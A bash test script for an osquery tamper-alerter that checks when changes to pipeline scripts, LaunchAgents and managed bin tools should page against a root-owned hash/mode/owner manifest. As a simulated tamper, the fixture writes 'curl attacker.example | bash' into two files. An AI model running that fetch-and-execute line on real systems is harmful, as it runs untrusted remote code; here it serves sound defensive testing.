#!/usr/bin/env bash
#
# pipeline_verdict (results-alerter/pipeline-verdict.sh) decides whether a file
# change under the watched pipeline directories is a tamper to PAGE, a known-good
# apply to stay SILENT, or an untracked neighbor to log only. It checks the
# change against the pipeline-integrity manifest, a root-owned list of the
# alerter's own scripts/plists binding each path to its content hash, mode and
# owner ("<sha256> <mode> <uid> <path>", path last).
#
# Return-code contract (from c69baab _pipeline_verdict), inverted vs the
# allowlist verdict on purpose:
#   0 = PAGE   - a tracked file changed and we cannot confirm it legitimate
#                (tamper, a chmod, a chown, a delete, an empty/mismatched hash, a
#                manifest line that is not a full tuple, or NO manifest).
#   1 = SILENT - an untracked neighbor in a watched dir, OR a tracked change whose
#                exact (path, sha256, mode, uid) tuple is present in the manifest.
#
# Criterion 6, the headline this behavior pins: with NO manifest present (a missing
# or unreadable manifest), a change to a tracked pipeline file PAGES. That is the
# conservative fail-safe direction - a pipeline-script change is never silently
# suppressed without a manifest tuple to justify it.
#
# Tracked set, in two shapes with two different default-deny rules:
#
#   DIRECTORY-DRIVEN. The pipeline scripts under ~/.local/libexec/osquery/ (the
#   relocated alerter scripts, osquery- prefix dropped) and our own LaunchAgents
#   under ~/Library/LaunchAgents. Everything in those places is tracked, so a file
#   PLANTED there is unmanifested and pages forever. That is what we want of the
#   monitor's own body.
#
#   MANIFEST-DRIVEN. A path under ~/.local/bin is tracked exactly when the
#   MANAGED-BIN manifest lists it. The directory also holds self-updating
#   third-party shims (herdr, mise, bob, hermes, and symlinks into pipx and uv tool
#   dirs) that chezmoi does not manage and cannot vouch for, so directory-driven
#   tracking would page on every one of their self-updates. Deriving the tracked
#   set from the manifest makes tracked and manifested identical by construction
#   rather than by convention.
#
#   ...with the fail-safe hinge: when the managed-bin manifest is missing,
#   unreadable, empty or untrustworthy, EVERY bin path is tracked instead. A
#   monitor whose known-good list broke must get louder, not quieter, so the
#   degraded direction is "page on bin events", never "ignore ~/.local/bin".
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"

fail() {
  printf 'osquery-pipeline-verdict: FAIL -- %s\n' "$*" >&2
  exit 1
}

[[ -f $HELPER ]] || fail "missing helper: $HELPER"
command -v shasum >/dev/null 2>&1 || fail "shasum is required for this test"

work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
home="$work/home"
mkdir -p "$home/.local/libexec/osquery/results-alerter" "$home/.local/bin" \
  "$home/Library/LaunchAgents" "$home/.config/osquery/packs"

# REAL files with REAL hashes: the verdict rehashes the target at judgment time,
# so a fixture manifest has to bind the content that is actually on disk. Mode and
# owner are re-read at judgment time for the same reason.
sha_of() { shasum -a 256 "$1" | awk '{print $1}'; }

uid_self="$(id -u)"
[[ $uid_self =~ ^[0-9]+$ ]] || fail "id -u did not report a numeric uid: $uid_self"
# A uid this fixture's files provably do NOT have. Tests cannot chown without
# privilege, so an ownership change is simulated from the manifest side: a tuple
# that names an owner the deployed file does not have is exactly the state a chown
# produces, and it is the state the verdict has to refuse.
foreign_uid=$((uid_self + 1))

libexec_script="$home/.local/libexec/osquery/results-alerter.sh"
# A MANAGED bin tool (in the managed-bin manifest) and an UNMANAGED third-party
# shim beside it (in no manifest, because chezmoi does not manage it). The shim is
# the churn case the whole manifest-driven tracking rule exists for: it rewrites
# itself on its own schedule and must never page.
bin_script="$home/.local/bin/update-skills.sh"
bin_shim="$home/.local/bin/mise"
# A managed bin tool whose bytes are replaced AFTER the bin manifest is written.
bin_tampered="$home/.local/bin/homebrew-weekly-upgrade.sh"
# A symlink standing where a manifested bin tool should be.
bin_symlink="$home/.local/bin/claude-audit.sh"
bin_symlink_data="$work/outside-bin-payload.sh"
# A second tracked file whose content is IDENTICAL to libexec_script: its hash is a
# real manifest hash, but bound to another path (the swap-in-place probe).
twin_script="$home/.local/libexec/osquery/twin.sh"
# A tracked file whose content is replaced AFTER the manifest is written (the
# stale-event-digest probe).
stale_script="$home/.local/libexec/osquery/stale.sh"
# A symlink standing where a manifested regular file should be, pointing at content
# that WOULD match the manifest if the verdict followed it.
symlink_path="$home/.local/libexec/osquery/linked.sh"
symlink_data="$work/outside-payload.sh"
# Attribute probes: content matches the manifest exactly, only mode or owner drift.
chmod_script="$home/.local/libexec/osquery/chmod-probe.sh"
setuid_script="$home/.local/libexec/osquery/setuid-probe.sh"
chown_script="$home/.local/libexec/osquery/chown-probe.sh"
# Malformed-manifest probes: content, mode and owner on disk are all fine, but the
# manifest line that would vouch for them is not parseable as a full tuple.
legacy_script="$home/.local/libexec/osquery/legacy-line.sh"
garbage_script="$home/.local/libexec/osquery/garbage-line.sh"
# The page-launchd allowlist. It DECIDES whether an unknown user LaunchAgent pages,
# so it is pipeline infrastructure and joins the tracked set at its EXACT path.
# Its neighbors in the same watched directory must stay untracked: the watch is a
# directory watch, and tracking the directory would put webhook-secret (a secret)
# and the writer's own lock file into the manifest's coverage, where neither can
# ever be confirmed and both would page forever.
allowlist_file="$home/.config/osquery/page-launchd-allowlist.txt"
allowlist_lock="$home/.config/osquery/page-launchd-allowlist.txt.lock"
neighbor_secret="$home/.config/osquery/webhook-secret"
neighbor_conf="$home/.config/osquery/osquery.conf"
neighbor_pack="$home/.config/osquery/packs/intrusion-detection.conf"

printf 'echo libexec\n' >"$libexec_script"
printf 'echo bin\n' >"$bin_script"
printf 'unmanaged self-updating binary\n' >"$bin_shim"
printf 'echo brew-upgrade\n' >"$bin_tampered"
printf 'echo audit\n' >"$bin_symlink_data"
ln -s "$bin_symlink_data" "$bin_symlink"
printf 'echo libexec\n' >"$twin_script" # same bytes as libexec_script
printf 'echo original\n' >"$stale_script"
printf 'echo linked\n' >"$symlink_data"
ln -s "$symlink_data" "$symlink_path"
printf 'echo chmod probe\n' >"$chmod_script"
printf 'echo setuid probe\n' >"$setuid_script"
printf 'echo chown probe\n' >"$chown_script"
printf 'echo legacy line\n' >"$legacy_script"
printf 'echo garbage line\n' >"$garbage_script"
printf '{"label":"com.seed","path":"~/x.plist","program":"~/x","sha256":""}\n' >"$allowlist_file"
printf 'lock\n' >"$allowlist_lock"
printf 'hunter2\n' >"$neighbor_secret"
printf '{}\n' >"$neighbor_conf"
printf '{}\n' >"$neighbor_pack"
# The allowlist deploys 0600 (chezmoi's private_ prefix), which is what its
# manifest tuple below records literally.
chmod 600 "$allowlist_file"

# Every manifested regular file is deployed 0755, which is what the manifest lines
# below record LITERALLY. The literal is deliberate: deriving the expected column
# from the same reader the implementation uses would make the mode comparison
# vacuous.
chmod 755 "$libexec_script" "$twin_script" "$stale_script" \
  "$chmod_script" "$setuid_script" "$chown_script" "$legacy_script" "$garbage_script"
chmod 755 "$bin_script" "$bin_tampered"

hash_libexec="$(sha_of "$libexec_script")"
hash_bin="$(sha_of "$bin_script")"
hash_bin_shim="$(sha_of "$bin_shim")"
hash_bin_tampered_original="$(sha_of "$bin_tampered")"
hash_bin_linked="$(sha_of "$bin_symlink_data")"
hash_stale_original="$(sha_of "$stale_script")"
hash_linked="$(sha_of "$symlink_data")"
hash_chmod="$(sha_of "$chmod_script")"
hash_setuid="$(sha_of "$setuid_script")"
hash_chown="$(sha_of "$chown_script")"
hash_legacy="$(sha_of "$legacy_script")"
hash_garbage="$(sha_of "$garbage_script")"
hash_allowlist="$(sha_of "$allowlist_file")"
hash_wrong="0000000000000000000000000000000000000000000000000000000000000000"

# The manifest binds content, mode AND owner to ITS path, one space-separated
# tuple per line: "<sha256> <mode> <uid> <path>". The path stays LAST so a path
# containing spaces is still read whole by `read -r hash mode uid path`.
#
# twin_script is deliberately ABSENT: its content hash exists in the manifest, but
# bound to libexec_script, so a hash-only check would wrongly bless it.
manifest="$work/pipeline-known-good.sha256"
{
  printf '%s 0755 %s %s\n' "$hash_libexec" "$uid_self" "$libexec_script"
  printf '%s 0755 %s %s\n' "$hash_stale_original" "$uid_self" "$stale_script"
  printf '%s 0755 %s %s\n' "$hash_linked" "$uid_self" "$symlink_path"
  printf '%s 0755 %s %s\n' "$hash_chmod" "$uid_self" "$chmod_script"
  printf '%s 0755 %s %s\n' "$hash_setuid" "$uid_self" "$setuid_script"
  # The chown probe: a correct content hash and mode, bound to an owner the
  # deployed file does not have.
  printf '%s 0755 %s %s\n' "$hash_chown" "$foreign_uid" "$chown_script"
  # The allowlist, at the 0600 its private_ source prefix deploys.
  printf '%s 0600 %s %s\n' "$hash_allowlist" "$uid_self" "$allowlist_file"
  # The OLD two-column shape. A manifest left over from before mode and owner were
  # bound must not be honored as a match, in either direction.
  printf '%s  %s\n' "$hash_legacy" "$legacy_script"
  # A line that is not a tuple at all.
  printf '%s\n' "$hash_garbage"
} >"$manifest"
absent_manifest="$work/no-such-manifest.sha256"

# The SEPARATE managed-bin manifest, same four-column shape. The unmanaged shim is
# deliberately absent from it, because chezmoi does not manage it and nothing can
# vouch for it.
bin_manifest="$work/managed-bin-known-good.sha256"
{
  printf '%s 0755 %s %s\n' "$hash_bin" "$uid_self" "$bin_script"
  printf '%s 0755 %s %s\n' "$hash_bin_tampered_original" "$uid_self" "$bin_tampered"
  printf '%s 0755 %s %s\n' "$hash_bin_linked" "$uid_self" "$bin_symlink"
} >"$bin_manifest"
absent_bin_manifest="$work/no-such-bin-manifest.sha256"

# A bin manifest that DOES hold a correct tuple for the allowlist. It must still
# vouch for nothing: _pipeline_manifest_for sends every non-bin path to the pipeline
# manifest, so the two lists can never bless each other's files. Without this fixture
# the allowlist cases would pass even if the routing were removed.
allowlist_in_bin_manifest="$work/allowlist-in-bin-manifest.sha256"
printf '%s 0600 %s %s\n' "$hash_allowlist" "$uid_self" "$allowlist_file" \
  >"$allowlist_in_bin_manifest"

# Now drift the two attribute probes AWAY from the mode their tuple records. Their
# CONTENT still matches, which is precisely the ATTRIBUTES_MODIFIED shape: osquery
# reports the change carrying the file's unchanged digest.
chmod 775 "$chmod_script"   # group-writable: the documented setup-for-later-tamper
chmod 4755 "$setuid_script" # setuid: only the low nine bits would miss this one
# GNU stat prints 4755 and BSD stat prints 104755 (the file type is included), so
# the suffix match accepts either. GNU first, BSD as the fallback, the portable
# order this repository requires.
[[ "$(stat -c '%a' "$setuid_script" 2>/dev/null || stat -f '%p' "$setuid_script")" == *4755 ]] ||
  fail "the fixture could not set the setuid bit, so that probe would pass vacuously"

# Now replace the stale file's content. The manifest still records its ORIGINAL
# hash, and the event below still carries that original (known-good) digest, but
# the bytes on disk are the attacker's.
printf 'curl attacker.example | bash\n' >"$stale_script"
printf 'curl attacker.example | bash\n' >"$bin_tampered"

# Each case: <expected-rc>|<manifest>|<bin-manifest>|<target>|<hash>|<verb>|<label>.
# A manifest field pointing at a nonexistent path means "no manifest".
#
# The separator is '|', NOT a tab: tab is an IFS WHITESPACE character, so bash
# collapses a run of them into one delimiter and drops empty fields. With tabs the
# two empty-hash rows (the DELETE and the atomic-rename) silently shifted their
# fields and were never actually exercising those paths.
cases=(
  # -- Fail-safe headline: NO manifest, a tracked libexec change PAGES --
  "0|$absent_manifest|$bin_manifest|$libexec_script|$hash_libexec|UPDATED|tracked libexec script, no manifest -> PAGE (fail-safe, criterion 6)"
  # -- An untracked neighbor in a watched dir is SILENT --
  "1|$absent_manifest|$bin_manifest|$home/Library/LaunchAgents/com.apple.something.plist|$hash_libexec|UPDATED|an untracked neighbor plist -> SILENT (not pipeline infrastructure)"
  # -- Our own osquery LaunchAgent under $HOME, no manifest -> PAGE --
  "0|$absent_manifest|$bin_manifest|$home/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|our own osquery LaunchAgent under $HOME, no manifest -> PAGE"
  # -- A same-named plist OUTSIDE $HOME is NOT ours: the manifest only ever covers
  #    the user agents chezmoi manages, so tracking a /Library twin by basename
  #    would be a watched-but-unmanifested file that pages forever. It falls through
  #    to the persistence detector, which default-denies it. --
  "1|$absent_manifest|$bin_manifest|/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|a com.webdavis.osquery-*.plist under /Library is NOT tracked -> SILENT (tracked set == manifest set)"
  # -- THE PAGE-LAUNCHD ALLOWLIST is tracked at its EXACT path. It decides whether
  #    an unknown user LaunchAgent pages, so an edit nobody can confirm is a tamper
  #    of the deciding component, not a note for tomorrow's digest. It is judged
  #    against the PIPELINE manifest, which is where every non-bin path routes. --
  "0|$absent_manifest|$bin_manifest|$allowlist_file|$hash_allowlist|UPDATED|the page-launchd allowlist, no pipeline manifest -> PAGE (it decides whether persistence pages)"
  "1|$manifest|$bin_manifest|$allowlist_file|$hash_allowlist|UPDATED|the allowlist at its manifested content, mode and owner -> SILENT (a legitimate apply)"
  # -- ...and the BIN manifest can never vouch for it. One target is judged against
  #    exactly one manifest, so a tuple in the wrong list blesses nothing. --
  "0|$absent_manifest|$allowlist_in_bin_manifest|$allowlist_file|$hash_allowlist|UPDATED|an allowlist tuple sitting in the BIN manifest does not vouch for it -> PAGE (one target, one manifest)"
  # -- ITS NEIGHBOURS in the same watched directory stay untracked. The watch is a
  #    DIRECTORY watch, so tracking the directory rather than the one file would pull
  #    in webhook-secret and the writer's own lock: neither is manifested, so both
  #    would page forever, and the secret's every touch would become a CRIT. --
  "1|$absent_manifest|$bin_manifest|$neighbor_secret|$hash_allowlist|UPDATED|the webhook-secret neighbor is untracked -> SILENT (never manifested, and not ours to judge)"
  "1|$absent_manifest|$bin_manifest|$allowlist_lock|$hash_allowlist|UPDATED|the writer's own .lock neighbor is untracked -> SILENT (it is created on every -a/-d)"
  "1|$absent_manifest|$bin_manifest|$neighbor_conf|$hash_allowlist|UPDATED|the osquery.conf neighbor is untracked -> SILENT (root serves the daemon config from /var)"
  "1|$absent_manifest|$bin_manifest|$neighbor_pack|$hash_allowlist|UPDATED|a packs/ neighbor is untracked -> SILENT"
  # -- A DELETE of a tracked file always PAGES, even with a manifest present --
  "0|$manifest|$bin_manifest|$libexec_script||DELETED|a delete of a tracked file -> PAGE (destructive, manifest cannot vouch)"
  "0|$manifest|$bin_manifest|$allowlist_file||DELETED|a delete of the allowlist -> PAGE (the deciding component vanished)"
  # -- Empty event hash (atomic-rename shape): debounce, rehash disk; no manifest -> PAGE --
  "0|$absent_manifest|$bin_manifest|$libexec_script||MOVED_TO|atomic-rename empty-hash event, no manifest -> PAGE after rehash"
  # -- Manifest present: the file's CURRENT content is known-good -> SILENT --
  "1|$manifest|$bin_manifest|$libexec_script|$hash_libexec|UPDATED|an unchanged tracked file whose current content is in the manifest -> SILENT"
  # -- THE STALE-DIGEST ATTACK: the event carries the KNOWN-GOOD digest recorded at
  #    event time, but the bytes on disk have since been replaced. The verdict must
  #    trust the MANIFEST against the CURRENT content, never the event digest, or an
  #    attacker can swap the file in after a good event is recorded, run, and
  #    restore before the next collection. --
  "0|$manifest|$bin_manifest|$stale_script|$hash_stale_original|UPDATED|a known-good EVENT digest whose on-disk content has since changed -> PAGE (rehash at judgment)"
  # -- A SYMLINK standing where a manifested regular file belongs -> PAGE, even
  #    though following it would hash to the manifested content. --
  "0|$manifest|$bin_manifest|$symlink_path|$hash_linked|UPDATED|a symlink at a manifested path -> PAGE (links are never followed)"
  # -- The event digest is NOT the trust input: a wrong/absent event hash on a file
  #    whose CURRENT content is known-good still resolves SILENT. --
  "1|$manifest|$bin_manifest|$libexec_script|$hash_wrong|UPDATED|an untrustworthy event digest does not decide the verdict when the content is known-good -> SILENT"
  # -- Manifest present: a real manifest hash bound to ANOTHER path -> PAGE. The
  #    twin has the same bytes as libexec_script, so a hash-only check would bless
  #    it; the (path, hash) binding is what refuses it. --
  "0|$manifest|$bin_manifest|$twin_script|$hash_libexec|UPDATED|swap-in-place (real content whose tuple is bound to another path) -> PAGE (tuple binding)"
  # -- ATTRIBUTES: a chmod on a manifested file PAGES. The content is byte-for-byte
  #    what the manifest records and the event carries that unchanged digest, so a
  #    content-only manifest returns SILENT here. Making a pipeline script
  #    group-writable is a plausible setup step for a later tamper from a less
  #    privileged context, so it has to page on its own. --
  "0|$manifest|$bin_manifest|$chmod_script|$hash_chmod|ATTRIBUTES_MODIFIED|a chmod g+w on a manifested file -> PAGE (mode is bound, not just content)"
  # -- ATTRIBUTES: the setuid bit is inside the bound mode. It lives above the low
  #    nine permission bits, so a mode reader that keeps only those (BSD stat %Lp)
  #    reads 4755 back as 0755 and blesses it. --
  "0|$manifest|$bin_manifest|$setuid_script|$hash_setuid|ATTRIBUTES_MODIFIED|a setuid bit set on a manifested file -> PAGE (all twelve mode bits are bound)"
  # -- OWNERSHIP: a file whose owner is not the one its tuple records PAGES, with
  #    content and mode both matching. --
  "0|$manifest|$bin_manifest|$chown_script|$hash_chown|ATTRIBUTES_MODIFIED|a manifested file owned by someone other than its tuple records -> PAGE (owner is bound)"
  # -- MALFORMED MANIFEST LINES resolve to PAGE, never to silence. Both probes have
  #    correct content, mode and owner on disk; only the line that would vouch for
  #    them is short. A pre-mode/owner manifest is exactly the two-column case. --
  "0|$manifest|$bin_manifest|$legacy_script|$hash_legacy|UPDATED|a two-column (pre mode/owner) manifest line -> PAGE (a short line never vouches)"
  "0|$manifest|$bin_manifest|$garbage_script|$hash_garbage|UPDATED|a one-field manifest line -> PAGE (an unparseable line never vouches)"

  # === the managed ~/.local/bin arm ==========================================
  # -- A managed bin tool whose current state matches its own manifest -> SILENT.
  #    Every legitimate apply of update-skills.sh lands here; if this paged, the
  #    coverage would be unusable. --
  "1|$manifest|$bin_manifest|$bin_script|$hash_bin|UPDATED|an unchanged managed bin tool whose tuple is in the managed-bin manifest -> SILENT"
  # -- THE HEADLINE: a managed bin tool tampered on disk PAGES. update-skills.sh and
  #    homebrew-weekly-upgrade.sh run unattended from LaunchAgents, so this is the
  #    behavior the whole change exists for. --
  "0|$manifest|$bin_manifest|$bin_tampered|$hash_bin_tampered_original|UPDATED|a TAMPERED managed bin tool -> PAGE (its manifested tuple no longer matches the bytes on disk)"
  # -- THE CHURN PIN: an UNMANAGED third-party shim in the same directory is not in
  #    the manifest, so it is not tracked and stays SILENT. mise, herdr, bob and
  #    yt-dlp rewrite themselves on their own schedule; paging on that would make
  #    the whole watch noise the operator learns to ignore. --
  "1|$manifest|$bin_manifest|$bin_shim|$hash_bin_shim|UPDATED|an UNMANAGED self-updating shim in ~/.local/bin -> SILENT (not manifested, so not tracked)"
  # -- A DELETE of a manifested bin tool PAGES: the manifest still lists it, so it
  #    is tracked, and there are no bytes left to vouch for. --
  "0|$manifest|$bin_manifest|$bin_script||DELETED|a delete of a manifested bin tool -> PAGE"
  # -- A SYMLINK standing where a manifested bin tool belongs -> PAGE, even though
  #    following it would hash to the manifested content. --
  "0|$manifest|$bin_manifest|$bin_symlink|$hash_bin_linked|UPDATED|a symlink at a manifested bin path -> PAGE (links are never followed)"
  # -- THE FAIL-SAFE HINGE: with the managed-bin manifest MISSING, a bin change
  #    cannot be confirmed legitimate, so it PAGES rather than going quiet. --
  "0|$manifest|$absent_bin_manifest|$bin_script|$hash_bin|UPDATED|a managed bin tool with NO managed-bin manifest -> PAGE (fail-safe)"
  # -- ...and the degraded direction is louder, not quieter: with no manifest even
  #    the unmanaged shim is tracked and pages. A broken known-good list must not
  #    silently un-watch the directory it was there to watch. --
  "0|$manifest|$absent_bin_manifest|$bin_shim|$hash_bin_shim|UPDATED|an unmanaged shim with NO managed-bin manifest -> PAGE (a broken manifest gets LOUDER, never quieter)"
)

expected=()
labels=()
feed=""
for row in "${cases[@]}"; do
  IFS='|' read -r rc manifest_path bin_manifest_path target hash verb label_text <<<"$row"
  expected+=("$rc")
  labels+=("$label_text")
  feed+="$manifest_path|$bin_manifest_path|$target|$hash|$verb"$'\n'
done

# One sourcing subshell drives every case. OSQUERY_PIPELINE_REHASH_DELAY=0 keeps
# the atomic-rename debounce from adding real wall time, and
# OSQUERY_PIPELINE_SETTLE_SECONDS=0 disables the apply-race settle wait: these
# cases pin the VERDICT, and the settle window is pinned separately (with real
# mtimes) in test/integration/osquery-pipeline-manifest-agreement.sh.
got=()
mapfile -t got < <(
  printf '%s' "$feed" | HOME="$home" OSQUERY_PIPELINE_REHASH_DELAY=0 OSQUERY_PIPELINE_SETTLE_SECONDS=0 bash -c '
    source "$1"
    while IFS="|" read -r manifest bin_manifest target hash verb; do
      OSQUERY_PIPELINE_MANIFEST="$manifest"
      OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest"
      rc=0
      pipeline_verdict "$target" "$hash" "$verb" || rc=$?
      printf "%s\n" "$rc"
    done
  ' _ "$HELPER"
)

[[ ${#got[@]} -eq ${#expected[@]} ]] ||
  fail "the verdict driver emitted ${#got[@]} results for ${#expected[@]} cases (one per case expected)"

for i in "${!expected[@]}"; do
  [[ ${got[i]} == "${expected[i]}" ]] ||
    fail "${labels[i]}: expected return ${expected[i]}, got ${got[i]}"
done

# --- the manifest must be root-owned before it may SUPPRESS a page -----------
# The design rests on a root-owned, non-group/world-writable manifest: anyone who
# could write it could self-whitelist a file they just tampered. The consumer
# verifies that rather than assuming it, so a permissions drift degrades LOUDLY
# (everything pages) instead of silently. Driven directly, with the
# OSQUERY_PIPELINE_MANIFEST override UNSET, because that override is the test seam
# that skips the check for fixture manifests.
trust_rc=0
HOME="$home" bash -c '
  source "$1"
  unset OSQUERY_PIPELINE_MANIFEST OSQUERY_MANAGED_BIN_MANIFEST
  _pipeline_manifest_is_trustworthy "$2"
' _ "$HELPER" "$manifest" || trust_rc=$?
[[ $trust_rc -ne 0 ]] ||
  fail "a manifest that is not root-owned must not be trusted to suppress a page"

printf 'osquery-pipeline-verdict: OK (fail-safe PAGE for a tracked libexec file without a manifest; a /Library plist twin is SILENT; delete PAGES; manifest tuple match SILENT, mismatch/swap-in-place PAGE; chmod, setuid and a foreign owner PAGE on unchanged content; short and unparseable manifest lines PAGE; a TAMPERED managed bin tool PAGES while an unmanaged shim beside it is SILENT, and a missing managed-bin manifest pages BOTH; a non-root-owned manifest is refused)\n'
